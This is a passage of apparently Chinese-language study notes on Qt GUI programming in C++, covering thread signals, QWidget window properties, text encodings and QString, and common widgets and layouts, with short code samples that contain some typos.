QThread&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  XThread();~XThread();</span><br><span class="line">  testQWidget* w = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    w-&gt;Hide(); <span class="comment">// 执行信号</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testQWidget</span>&#123;</span></span><br><span class="line">  Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  testQWidget()&#123;connect(<span class="keyword">this</span>,SIGNAL(Hide),<span class="keyword">this</span>,SLOT(hide()));&#125;;<span class="keyword">virtual</span> ~testQWidget()&#123;&#125;;</span><br><span class="line">signals:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Hide</span><span class="params">()</span></span>&#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">  <span class="function">QApplication <span class="title">a</span><span class="params">(argc,argv)</span></span>;</span><br><span class="line">  testQWidget w;</span><br><span class="line">  w.show();</span><br><span class="line">  XThread xt;</span><br><span class="line">  xt.w = &amp;w;</span><br><span class="line">  xt.start();</span><br><span class="line">  <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在qthread中添加信号绑定到qwidget"><a class="markdownIt-Anchor" href="#在qthread中添加信号绑定到qwidget"></a> 在QThread中添加信号，绑定到QWidget</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QtWidgets/QApplication&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QWidget&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QThread&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">XThread</span>:</span><span class="keyword">public</span> QThread&#123;</span><br><span class="line">  Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  XThread()&#123;&#125;;</span><br><span class="line">  ~XThread()&#123;<span class="built_in">terminate</span>();&#125;; <span class="comment">//在项目退出时，保证线程退出，这个是不安全的方法</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">    msleep(<span class="number">1000</span>);</span><br><span class="line">    Move(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  &#125;;</span><br><span class="line">signals:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Move</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>;  <span class="comment">//只需声明，无需实现</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">testQWidget</span>&#123;</span></span><br><span class="line">  Q_OBJECT</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  testQWidget()&#123;&#125;;<span class="keyword">virtual</span> ~testQWidget()&#123;&#125;;</span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">move</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;QWidget::move(x,y);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span>&#123;</span><br><span class="line">  <span class="function">QApplication <span class="title">a</span><span class="params">(argc,argv)</span></span>;</span><br><span class="line">  w.show();</span><br><span class="line">  XThread xt;</span><br><span class="line">  QObject::connect(&amp;xt,SIGNAL(Move(<span class="keyword">int</span>,<span class="keyword">int</span>)),&amp;w,SLOT(move(<span class="keyword">int</span>,<span class="keyword">int</span>)))</span><br><span class="line">  xt.w = &amp;w;</span><br><span class="line">  xt.start();</span><br><span class="line">  <span class="keyword">return</span> a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="qt核心窗口类qwidget"><a class="markdownIt-Anchor" href="#qt核心窗口类qwidget"></a> Qt核心窗口类QWidget</h1><ul><li>QWidget是所有用户界面对象的基类</li><li>窗口部件接收鼠标、键盘等事件</li><li>屏幕上绘制自己</li><li>父子关系有相对坐标</li></ul><h2 id="手动创建qwidget对象"><a class="markdownIt-Anchor" href="#手动创建qwidget对象"></a> 手动创建QWidget对象</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">QWidget w;</span><br><span class="line">w.show();<span class="comment">//显示包含子窗口，是一个槽函数</span></span><br><span class="line">w.setWindowTitle(<span class="string">&quot;my widget&quot;</span>);  <span class="comment">//设置title</span></span><br><span class="line">w.hide();<span class="comment">//隐藏包含子窗口，槽函数，资源并未释放</span></span><br></pre></td></tr></table></figure><h2 id="窗口的属性"><a class="markdownIt-Anchor" href="#窗口的属性"></a> 窗口的属性</h2><h3 id="设置窗口坐标和大小"><a class="markdownIt-Anchor" href="#设置窗口坐标和大小"></a> 设置窗口坐标和大小</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>QRect geometry()</code></td><td>获取坐标和宽高</td></tr><tr><td><code>setGeometry(x,y,width,height)</code></td><td>设置坐标和宽高</td></tr><tr><td><code>x();y();width();height()</code></td><td>获取坐标和宽高</td></tr><tr><td><code>move(x,y);resize(width,height)</code></td><td>设置坐标和宽高</td></tr></tbody></table><h3 id="设置窗口最大化-最小化-全屏-正常"><a class="markdownIt-Anchor" href="#设置窗口最大化-最小化-全屏-正常"></a> 设置窗口最大化、最小化、全屏、正常</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>setWindowState(Qt::WindowMaximized)</code></td><td>设置窗口状态</td></tr><tr><td><code>showMinimized()</code></td><td>设置</td></tr><tr><td><code>showMaximized()</code></td><td>设置</td></tr><tr><td><code>showNormal()</code></td><td>设置</td></tr><tr><td><code>showFullScreen()</code></td><td>设置</td></tr></tbody></table><table><thead><tr><th>Qt::WindowMaximized</th><th>说明</th></tr></thead><tbody><tr><td><code>WindowMinimized</code></td><td>窗口最小化</td></tr><tr><td><code>WindowMaximized</code></td><td>窗口最大化</td></tr><tr><td><code>WindowNoState</code></td><td>窗口无状态</td></tr><tr><td><code>WindowFullScreen</code></td><td>窗口全屏</td></tr><tr><td><code>WindowActive</code></td><td>活动状态</td></tr></tbody></table><h3 id="定制窗口类型"><a class="markdownIt-Anchor" href="#定制窗口类型"></a> 定制窗口类型</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>CustomizeWindowHint</code></td><td>自定义</td></tr><tr><td><code>setWindowFlags</code></td><td>设置类型，指定多个值</td></tr><tr><td><code>setWindowFlag(Qt::WindowCloseButtonHint,flase)</code></td><td>设置类型</td></tr></tbody></table><table><thead><tr><th>窗口按钮</th><th>说明</th></tr></thead><tbody><tr><td><code>Qt::WindowCloseButtonHint</code></td><td>关闭按钮</td></tr><tr><td><code>Qt::WindowWindowMinimizeHint</code></td><td>最小化按钮</td></tr><tr><td><code>Qt::WindowWindowMaximizeHint</code></td><td>最大化按钮</td></tr><tr><td><code>Qt::FramelessWindowHint</code></td><td>无边框的窗体</td></tr><tr><td><code>Qt::WindowTitleHint|Qt::CustomWindowHint</code></td><td>标题栏保留，取出所有按钮</td></tr><tr><td><code>Qt::CustomWindowHint</code></td><td>全部自定义</td></tr></tbody></table><h1 id="qt文本处理"><a class="markdownIt-Anchor" href="#qt文本处理"></a> Qt文本处理</h1><h2 id="字符集"><a class="markdownIt-Anchor" href="#字符集"></a> 字符集</h2><h3 id="编码"><a class="markdownIt-Anchor" href="#编码"></a> 编码</h3><ul><li>ASCii：7位字符集，128个字符，最高位作为奇偶校验，在转码传输时会被丢弃。</li><li>ISO-8859-1扩展ASCii：128-255拉丁</li><li>ANSI标准：没够国家标准学会，多字节字符集（MBCS），0-127依旧是1个字节代表1个字符，2个字节来表示1个字符</li><li>GB2312编码：ANSI 6763常用汉字，两个大于127的字符表示一个汉字</li><li>GBK编码：在GB2312的基础上扩展汉字21003个</li><li>UTF-8编码：变长的编码方式，单字节与ASCii相同，对于n个字节，首字节前n位为1，n+1为0，后面字节前两位都为10。</li></ul><p><img src="/images/pasted-66.png" alt="UTF-8编码" /></p><ul><li>UTF-16编码：两个字节或四个字节</li><li>UTF-32编码：四个字节</li></ul><h3 id="字节序bom"><a class="markdownIt-Anchor" href="#字节序bom"></a> 字节序BOM</h3><ul><li>LE(littleEndian)：小字节字节序，地位在前：<code>0x001A23</code>–<code>23 1A 00</code></li><li>BE(bigEndian)：大字节字节序，地位在前：<code>0x001A23</code>–<code>00 1A 23</code></li><li>BOM字节序标志头：</li></ul><table><thead><tr><th>字节序标志头</th><th>字节序</th></tr></thead><tbody><tr><td><code>FE FF</code></td><td>BE</td></tr><tr><td><code>FF FE</code></td><td>LE</td></tr></tbody></table><h2 id="qstring"><a class="markdownIt-Anchor" href="#qstring"></a> QString</h2><ul><li>16-bit Qchar ushort Unicode 4.0</li></ul><h3 id="常用功能"><a class="markdownIt-Anchor" href="#常用功能"></a> 常用功能</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>==</code></td><td>相等判断</td></tr><tr><td><code>isNull()</code></td><td>是否null</td></tr><tr><td><code>isEmpty()</code></td><td>是否为空</td></tr><tr><td><code>+=</code></td><td>字符拼接</td></tr><tr><td><code>append(char*)</code></td><td>添加字符串</td></tr><tr><td><code>%1 %2 arg()</code></td><td>格式化字符串，arg(int,最小宽度,进制数)</td></tr><tr><td><code>QString::number(int)</code></td><td>数字转字符串</td></tr><tr><td><code>QString.toInt()</code></td><td>字符串转数字，注意不要转换浮点型，返回为0</td></tr><tr><td><code>QString.toDouble()</code></td><td>字符串转数字</td></tr><tr><td><code>QChar.toLatin1()</code></td><td>字符串转数字</td></tr><tr><td>`for(QString::iterator itr=itstr.begin();itr!=itstr.end();itr++)</td><td></td></tr><tr><td><code>&lt;br&gt;</code>for(int i=0;i&lt;itstr.size();i++)`</td><td>字符串遍历，返回QChar类型</td></tr><tr><td><code>itstr.indexOf(string,[startIndex])</code></td><td>字符串查找，找不到返回-1</td></tr><tr><td><code>itstr.lastIndexOf(string)</code></td><td>字符串查找</td></tr><tr><td><code>itstr.indexOf(QRegExp())</code></td><td>字符串正则表达式查找</td></tr><tr><td><code>itstr.chop(int)</code></td><td>字符串结去除尾部n个字符，直接改变原对象</td></tr><tr><td><code>itstr.left(int)</code></td><td>返回从字符串左边开始的n个字符</td></tr><tr><td><code>itstr.right(int)</code></td><td>返回从字符串右边开始的n个字符，从最右边开始</td></tr><tr><td><code>itstr.replace(string,string)</code></td><td>字符串替换，直接改变原对象</td></tr><tr><td><code>itstr.replace(QRegExp(),string)</code></td><td>字符串正则替换</td></tr><tr><td><code>QStringList itstr.split(sep)</code></td><td>字符串切割，也支持正则表达式</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line">QString str;</span><br><span class="line"><span class="keyword">if</span> (str.isNull())&#123;qDebug()&lt;&lt;<span class="string">&quot;str is null&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line"><span class="keyword">if</span> (str.isEmpty())&#123;qDebug()&lt;&lt;<span class="string">&quot;str is empty&quot;</span>&lt;&lt;<span class="built_in">endl</span>;&#125;;</span><br><span class="line">str = QString(<span class="string">&quot;name=%1 age=%2&quot;</span>).arg(<span class="string">&quot;xxx&quot;</span>).arg(<span class="number">12</span>);</span><br></pre></td></tr></table></figure><h2 id="qt中文乱码问题"><a class="markdownIt-Anchor" href="#qt中文乱码问题"></a> QT中文乱码问题</h2><ul><li>默认字符集设置</li><li>文件字符集格式vs qtcreator设置</li><li>字符集转换QStringLiteral</li><li>通过预编译宏，设置原文件是gbk的编码转utf8：<code>#pragma execution_character_set(&quot;UTF-8&quot;)</code></li></ul><h3 id="字符集设置"><a class="markdownIt-Anchor" href="#字符集设置"></a> 字符集设置</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>codec = QTextCodec::codecForName(&quot;UTF-8&quot;);</code></td><td>设置本地编码格式</td></tr><tr><td><code>QTextCodec::setCodecForLocale(codec);</code></td><td>本地处理的字符集</td></tr><tr><td><code>QTextCodec::availableCodecs();</code></td><td>查询支持哪些格式字符集</td></tr><tr><td><code>QString::fromLocal9Bit(string);</code></td><td>根据本地编码方式存入QString，默认是GBK</td></tr><tr><td><code>QString::toStdString();</code></td><td>把QString转为char* 或者string</td></tr><tr><td><code>QString::toStdWString();</code></td><td>把QString转为宽字符集，以支持win64，例如：L&quot;1234&quot;</td></tr><tr><td><code>QString::toLocal9Bit();</code></td><td>把QString转为本地编码格式</td></tr><tr><td><code>QStringLiteral(&quot;中文&quot;)</code></td><td>将多字节编码转为UTF-8</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QDebug&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;QMessageBox&gt;</span></span></span><br><span class="line">QString str = <span class="string">&quot;中文&quot;</span>;</span><br><span class="line">qDebug&lt;&lt;str; <span class="comment">//此时打印为乱码</span></span><br><span class="line">str = QStringLiteral(<span class="string">&quot;中文&quot;</span>); <span class="comment">//将多字节编码转为UTF-8</span></span><br><span class="line">qDebug&lt;&lt;str; <span class="comment">//此时正常输出中文</span></span><br><span class="line">QMessageBox::information(<span class="number">0</span>,<span class="string">&quot;title&quot;</span>,str);</span><br></pre></td></tr></table></figure><h1 id="qt控件"><a class="markdownIt-Anchor" href="#qt控件"></a> Qt控件</h1><h2 id="qlabel"><a class="markdownIt-Anchor" href="#qlabel"></a> QLabel</h2><ul><li>继承于QWidget</li></ul><h3 id="显示文字"><a class="markdownIt-Anchor" href="#显示文字"></a> 显示文字</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ui.label-&gt;setText(QString(<span class="string">&quot;String&quot;</span>))</span><br></pre></td></tr></table></figure><h3 id="样式设置"><a class="markdownIt-Anchor" href="#样式设置"></a> 样式设置</h3><ul><li><p>设计器设置：右击label空间，选择“改变样式表”，选择添加颜色等操作。在属性编辑器中选择对齐方式。</p></li><li><p>代码设置：</p></li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">label.setStyleSheet(QString::fromUtf8(<span class="string">&quot;color:rgb(255,0,0);&quot;</span>));</span><br></pre></td></tr></table></figure><h3 id="显示图片"><a class="markdownIt-Anchor" href="#显示图片"></a> 显示图片</h3><ul><li>在属性编辑器中，选择pixmap，选择图片进行显示</li><li>代码设置</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">label.setPixmap(QPixmap(QString::fromUtf8(<span class="string">&quot;:/项目名/Resources/test.jpg&quot;</span>)));</span><br></pre></td></tr></table></figure><ul><li>通过样式设置</li></ul><figure class="highlight"><table><tr><td class="code"><pre><span class="line">backgroud-images:url(:/项目名/Resources/test.jpg);</span><br><span class="line">border-images:url(:/项目名/Resources/test.jpg);</span><br><span class="line">images:url(:/项目名/Resources/test.jpg);</span><br></pre></td></tr></table></figure><h3 id="播放gif动画"><a class="markdownIt-Anchor" href="#播放gif动画"></a> 播放gif动画</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">QMovie *mov = <span class="keyword">new</span> QMovie(<span class="string">&quot;test.gif&quot;</span>);</span><br><span class="line">lab.setMovie(mov)</span><br><span class="line">mov-&gt;start();</span><br></pre></td></tr></table></figure><h3 id="创建qlabel"><a class="markdownIt-Anchor" href="#创建qlabel"></a> 创建QLabel</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">QLabel *lab = <span class="keyword">new</span> QLabel(<span class="keyword">this</span>); <span class="comment">//this表示属于哪个窗体的，如果为null则单独显示一个label</span></span><br><span class="line">lab-&gt;setGeometry(<span class="number">0</span>,<span class="number">0</span>,<span class="number">200</span>,<span class="number">200</span>);</span><br><span class="line">lab-&gt;setStyleSheet(<span class="string">&quot;background-color:rgb(255,0,0)&quot;</span>);</span><br><span class="line">lab.show();</span><br></pre></td></tr></table></figure><h3 id="qlabel的富文本模式"><a class="markdownIt-Anchor" href="#qlabel的富文本模式"></a> QLabel的富文本模式</h3><ul><li>前面QLabel都是PlainText模式，支持\n换行，QLabel也支持富文本RichText模式，支持html。</li><li>在属性编辑器中，点击textFormat选择RichText，双击即可用html编辑</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lab-&gt;setTextFormat(Qt::RichText);</span><br></pre></td></tr></table></figure><h4 id="链接事件"><a class="markdownIt-Anchor" href="#链接事件"></a> 链接事件</h4><ul><li>QLabel链接事件绑定了两个槽函数</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>void linkActivated(const QString &amp;link)</td><td>点击事件</td></tr><tr><td>void linkHovered(const QString &amp;link)</td><td>悬停事件</td></tr></tbody></table><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//---------类中定义槽-------------</span></span><br><span class="line"><span class="keyword">public</span> slots:</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Act</span><span class="params">(QString url)</span></span>;</span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Hov</span><span class="params">(QString url)</span></span>;</span><br><span class="line"><span class="comment">//---------ui中绑定-------------</span></span><br><span class="line">connect(ui.label,SIGNAL(linkActivated()),<span class="keyword">this</span>,SLOT(Act()));</span><br><span class="line">connect(ui.label,SIGNAL(linkHovered()),<span class="keyword">this</span>,SLOT(Hov()));</span><br></pre></td></tr></table></figure><h3 id="qlabel选择和编辑"><a class="markdownIt-Anchor" href="#qlabel选择和编辑"></a> QLabel选择和编辑</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>setTextInteractionFlags</td><td>设置是否可以选择、编辑</td></tr><tr><td>selectedText</td><td>获取选择的文本</td></tr><tr><td>setSelection(startIndex,length)</td><td>设置选了什么文本</td></tr></tbody></table><table><thead><tr><th>Flags</th><th>说明</th></tr></thead><tbody><tr><td>NoTextInteraction</td><td></td></tr><tr><td>TextSelectableByMouse</td><td></td></tr><tr><td>TextSelectableByKeyboard</td><td></td></tr><tr><td>LinksAccessibleByMouse</td><td></td></tr><tr><td>LinksAccessibleByKeyboard</td><td></td></tr><tr><td>TextEditable</td><td></td></tr></tbody></table><h2 id="qpushbutton"><a class="markdownIt-Anchor" href="#qpushbutton"></a> QPushButton</h2><h3 id="事件设置"><a class="markdownIt-Anchor" href="#事件设置"></a> 事件设置</h3><table><thead><tr><th>事件信号</th><th>说明</th></tr></thead><tbody><tr><td>click()</td><td></td></tr><tr><td>click(bool)</td><td>是否选中</td></tr><tr><td>pressed()</td><td></td></tr><tr><td>released()</td><td></td></tr></tbody></table><h3 id="快捷键设置"><a class="markdownIt-Anchor" href="#快捷键设置"></a> 快捷键设置</h3><ul><li>在按钮添加快捷键，有两种方法，在按钮名前加<code>&amp;</code>符号，那么按钮名的首字母+<code>Alt</code>就是快捷键了。第二种方法就是代码设置</li></ul><table><thead><tr><th>事件信号</th><th>说明</th></tr></thead><tbody><tr><td>setShortcut</td><td></td></tr><tr><td>setShortcut(tr(“Alt+F7”))</td><td><code>ui-&gt;shortcut-&gt;setShortcut(tr(&quot;X&quot;));</code></td></tr><tr><td>setShortcut(tr(“Ctrl+x,Ctrl+c”))</td><td>组合按键</td></tr></tbody></table><h3 id="样式设置-2"><a class="markdownIt-Anchor" href="#样式设置-2"></a> 样式设置</h3><ul><li>样式设置和label设置差不多，背景图片设置中有flat设置，可以取消按钮的凹凸效果，样式可以自己更改。</li><li>圆角边框，渐变援交光泽按钮</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">QPushButton::!hover&#123;</span><br><span class="line">  background-color:qradialgradient(spread:reflact......)</span><br><span class="line">&#125;</span><br><span class="line">QPushButton::hover&#123;</span><br><span class="line">  border-radius:<span class="number">10</span>px;</span><br><span class="line">  background-color:qradialgradient(spread:reflact......)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="qlineedit"><a class="markdownIt-Anchor" href="#qlineedit"></a> QLineEdit</h2><h3 id="属性方法槽"><a class="markdownIt-Anchor" href="#属性方法槽"></a> 属性方法槽</h3><table><thead><tr><th>事件信号</th><th>说明</th></tr></thead><tbody><tr><td>setText()</td><td>设置文本，不发信号</td></tr><tr><td>text()</td><td>获取文本</td></tr><tr><td>setPlaceholderText()</td><td>设置提示文字</td></tr><tr><td>setClearButtonEnabled</td><td>默认关闭清空内容</td></tr><tr><td>setReadOnly</td><td>设置是否只读</td></tr><tr><td>setMaxLength</td><td>默认长度3万多</td></tr><tr><td>undo()</td><td>撤销</td></tr><tr><td>redo()</td><td>恢复</td></tr></tbody></table><h3 id="信号事件"><a class="markdownIt-Anchor" href="#信号事件"></a> 信号事件</h3><table><thead><tr><th>事件信号</th><th>说明</th></tr></thead><tbody><tr><td>editingFinished</td><td>按下回车或者焦点移开，触发事件</td></tr><tr><td>returnPressed</td><td>按下回车</td></tr><tr><td>textChanged</td><td>用户输入或者setText()调用，激发事件</td></tr><tr><td>textEdited</td><td>只有用户手动修改激发事件</td></tr></tbody></table><h3 id="输入验证正则"><a class="markdownIt-Anchor" href="#输入验证正则"></a> 输入验证（正则）</h3><ul><li>格式掩码</li></ul><table><thead><tr><th>掩码</th><th>说明</th></tr></thead><tbody><tr><td><code>setInputMask(&quot;000.000.000.000;_&quot;)</code></td><td>格式化字符串，后面的<code>;_</code>代表不填写时默认显示<code>_</code></td></tr></tbody></table><p><img src="/images/pasted-67.png" alt="掩码格式" /></p><h3 id="复杂验证qvalidator-qregexpvalidator"><a class="markdownIt-Anchor" href="#复杂验证qvalidator-qregexpvalidator"></a> 复杂验证QValidator、QRegExpValidator</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//整型</span></span><br><span class="line">QIntValidator *ival = <span class="keyword">new</span> QIntValidator();</span><br><span class="line">ival-&gt;setRange(<span class="number">10</span>,<span class="number">1000</span>);</span><br><span class="line">ui.iedit-&gt;setValidator(ival);</span><br><span class="line"><span class="comment">//浮点型</span></span><br><span class="line"><span class="comment">//默认科学计数法，会在输入完校验</span></span><br><span class="line">QDoubleValidator *dval = <span class="keyword">new</span> QDoubleValidator();</span><br><span class="line">dval-&gt;setRange(<span class="number">1</span>,<span class="number">199</span>); <span class="comment">//结合写法：dval-&gt;setRange(1,199,3); </span></span><br><span class="line">dval-&gt;setDecimal(<span class="number">3</span>);</span><br><span class="line"><span class="comment">//更改为普通计数法</span></span><br><span class="line">dval-&gt;setNotation(QDoubleValidator::StandardNotation);</span><br><span class="line">ui.dedit-&gt;setValidator(ival);</span><br><span class="line"><span class="comment">//正则</span></span><br><span class="line"><span class="function">QRegExpValidator *pReg <span class="keyword">new</span> <span class="title">QRegExpValidator</span><span class="params">(QRegExp(<span class="string">&quot;\d+&quot;</span>),<span class="keyword">this</span>)</span></span>;</span><br><span class="line">ui.email-&gt;setVlidator(pReg);</span><br><span class="line"><span class="comment">//-------在信号函数校验--------</span></span><br><span class="line"><span class="keyword">const</span> QValidator *v = ui.email-&gt;validator();</span><br><span class="line"><span class="keyword">int</span> pos = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//返回：Invalid 0；Intermediate 1；Acceptable 2</span></span><br><span class="line"><span class="keyword">if</span> v-&gt;validate(ui.email-&gt;text(),pos)!=QValidator::Acceptable&#123;</span><br><span class="line">  ui.label-&gt;setText(QString::fromLocal8bit(<span class="string">&quot;格式不正确&quot;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="显示样式"><a class="markdownIt-Anchor" href="#显示样式"></a> 显示样式</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>setEchoMode(QLineEdid::Normal)</code></td><td></td></tr></tbody></table><table><thead><tr><th>Flags</th><th>说明</th></tr></thead><tbody><tr><td>Normal</td><td></td></tr><tr><td>NoEcho</td><td></td></tr><tr><td>Password</td><td></td></tr><tr><td>PasswordEchoOnEdit</td><td></td></tr></tbody></table><h2 id="qobject"><a class="markdownIt-Anchor" href="#qobject"></a> QObject</h2><h3 id="遍历所有qobject子节点"><a class="markdownIt-Anchor" href="#遍历所有qobject子节点"></a> 遍历所有QObject子节点</h3><ul><li>遍历子节点，获取节点对象名称<code>QObjectList children()</code>、<code>objectName</code>，</li><li>转换子节点-获取节点对象类型</li></ul><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>QObjectList cs = this-&gt;children()</code></td><td>遍历子节点</td></tr><tr><td><code>cs[1]-&gt;objectName</code></td><td>获取节点对象名称</td></tr><tr><td><code>QMetaObject *mobj = QObject-&gt;metaObject()</code></td><td>获取节点对象类型的元数据</td></tr><tr><td><code>metaObject()-&gt;className</code></td><td>获取类的名称</td></tr><tr><td><code>qobject_cast&lt;QCheckBox*&gt;(cb)</code></td><td>转换子节点，转换失败返回NULL</td></tr></tbody></table><h2 id="qlayout"><a class="markdownIt-Anchor" href="#qlayout"></a> QLayout</h2><ul><li>布局器依赖于QWidget</li></ul><table><thead><tr><th>布局</th><th>说明</th></tr></thead><tbody><tr><td>Vertical Layout</td><td>垂直布局</td></tr><tr><td>Horizontal Layout</td><td>水平布局</td></tr><tr><td>Grid Layout</td><td>网格布局</td></tr><tr><td>From Layout</td><td>表单布局</td></tr></tbody></table><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td><code>QSize sizeHint()</code></td><td>推荐尺寸只能重载修改</td></tr><tr><td><code>QSizePolicy::PolicyFlag</code></td><td>尺寸策略</td></tr><tr><td><code>setContentsMargins</code></td><td>设置边距</td></tr><tr><td><code>setMinimumSize(width,height)</code></td><td>设置最小尺寸</td></tr><tr><td><code>setMaximumSize(width,height)</code></td><td>设置最大尺寸</td></tr><tr><td><code>setSpacing(width)</code></td><td>设置间距</td></tr><tr><td><code>QGridLayout::setVerticalSpacing(width)</code></td><td>设置水平间距</td></tr><tr><td><code>QGridLayout::setHorizontalSpacing(width)</code></td><td>设置垂直间距</td></tr><tr><td><code>QFormLayout::addRow(tr(&quot;&amp;name&quot;),nameLineEdit)</code></td><td></td></tr><tr><td><code>QFormLayout::insertRow(row,tr(&quot;&amp;name&quot;),nameLineEdit)</code></td><td></td></tr><tr><td><code>QLayoutItem *itemAt(row,ItemRole)</code></td><td></td></tr><tr><td><code>QLayoutItem::widget()</code></td><td>转为widget，否则返回null</td></tr></tbody></table><table><thead><tr><th>PolicyFlag</th><th>说明</th></tr></thead><tbody><tr><td>GrowFlag</td><td>必要时超过推荐</td></tr><tr><td>ExpandFlag</td><td>尽可能扩展</td></tr><tr><td>ShrinkFlag</td><td>必要时小于推荐</td></tr><tr><td>IgnoreFlag</td><td>缺省大小忽略</td></tr></tbody></table><h3 id="手动添加qlayout"><a class="markdownIt-Anchor" href="#手动添加qlayout"></a> 手动添加QLayout</h3><ul><li>添加QVBoxLayout/QHBoxLayout</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">QWidget *w = <span class="keyword">new</span> QWidget;</span><br><span class="line">QVBoxLayout *lay = <span class="keyword">new</span> QVBoxLayout(w); <span class="comment">//绑定方式一</span></span><br><span class="line"><span class="comment">//w-&gt;setLayout(lay)绑定方式二</span></span><br><span class="line">QPushButton *btn = <span class="keyword">new</span> QPushButton(<span class="string">&quot;button&quot;</span>);</span><br><span class="line">lay-&gt;addWidget(btn1);</span><br><span class="line">w.show()</span><br></pre></td></tr></table></figure><ul><li>添加QGridLayout</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">lay-&gt;addWidget(btn,<span class="keyword">int</span> row,<span class="keyword">int</span> column,Qt::Alignment);</span><br></pre></td></tr></table></figure><ul><li>添加QFromLayout：插入项目addRow和insertRow、遍历项目、表单验证</li></ul><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## QCheckBox</span><br><span class="line">- 选择项，继承于QAbstractButton，支持快捷键</span><br><span class="line"></span><br><span class="line">|函数|说明|</span><br><span class="line">|-|-|</span><br><span class="line">|text()|获取文本信息|</span><br><span class="line">|setText()|设置文本信息|</span><br><span class="line">|bool isChecked() const|状态|</span><br><span class="line">|void setChecked(bool)|设置状态|</span><br><span class="line">|void toggled()|设置状态|</span><br><span class="line">|setAutoExclusive()|设置排他，同一级别的，可以放在不同的widget中，相互不影响|</span><br><span class="line"></span><br><span class="line">|事件|说明|</span><br><span class="line">|-|-|</span><br><span class="line">|clicked(<span class="keyword">bool</span>)|点击事件|</span><br><span class="line">|toggled(<span class="keyword">bool</span>)|变化触发|</span><br><span class="line"></span><br><span class="line">### QButtonGroup</span><br><span class="line">- QCheckBox可以放入组中管理，加入组中默认设为单选，可以设置是否排他</span><br><span class="line"></span><br><span class="line">|函数|说明|</span><br><span class="line">|-|-|</span><br><span class="line">|setEclusive(<span class="keyword">bool</span>)|设置是否单选|</span><br><span class="line"></span><br><span class="line">|事件|说明|</span><br><span class="line">|-|-|</span><br><span class="line">|`void buttonClicked(QAbstractButton *button)`||</span><br><span class="line">|`void buttonClicked(int id)`||</span><br><span class="line">|`void 